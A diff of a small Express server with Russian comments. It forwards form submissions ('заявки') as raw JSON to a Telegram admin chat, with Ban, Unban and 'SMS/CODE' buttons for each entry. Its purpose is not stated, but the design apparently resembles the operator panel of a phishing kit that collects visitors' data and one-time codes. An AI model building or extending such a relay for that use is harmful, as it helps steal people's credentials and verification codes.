@@ -3,61 +3,48 @@ const app = express();
 
 app.use(express.json());
 
-// база заявок
-let users = {};
+let botInstance = null;
 
-// создать заявку (с сайта)
+// подключаем бот
+function setBot(bot) {
+  botInstance = bot;
+}
+
+// создать заявку
 app.post("/create", (req, res) => {
-  const id = Date.now().toString(); // уникальный ID
-  users[id] = {
-    data: req.body,
-    status: "new"
-  };
+  const id = Date.now().toString();
 
-  sendToTelegram(id, req.body);
+  const data = req.body;
+
+  if (botInstance) {
+    botInstance.sendMessage(
+      process.env.ADMIN_CHAT_ID,
+      `🆕 Заявка\nID: ${id}\n\n${JSON.stringify(data)}`,
+      {
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "🚫 Бан", callback_data: `ban_${id}` },
+              { text: "✅ Разбан", callback_data: `unban_${id}` }
+            ],
+            [
+              { text: "➡️ SMS/CODE", callback_data: `allow_${id}` }
+            ]
+          ]
+        }
+      }
+    );
+  }
 
   res.json({ ok: true, id });
 });
 
-// изменить статус
-app.post("/action", (req, res) => {
-  const { id, action } = req.body;
-
-  if (users[id]) {
-    users[id].status = action;
-  }
-
-  res.json({ ok: true });
-});
-
-// отправка в Telegram через бот
-function sendToTelegram(id, data) {
-  const text = `🆕 Заявка
-ID: ${id}
-
-${JSON.stringify(data, null, 2)}`;
-
-  global.bot.sendMessage(global.adminChatId, text, {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "🚫 Бан", callback_data: `ban_${id}` },
-          { text: "✅ Разбан", callback_data: `unban_${id}` }
-        ],
-        [
-          { text: "➡️ СМС/КОД", callback_data: `allow_${id}` }
-        ]
-      ]
-    }
-  });
-}
-
 app.get("/", (req, res) => {
-  res.send("server ok");
+  res.send("ok");
 });
 
 app.listen(process.env.PORT || 3000, () => {
   console.log("Server started");
 });
 
-module.exports = { users };
+module.exports = { setBot };
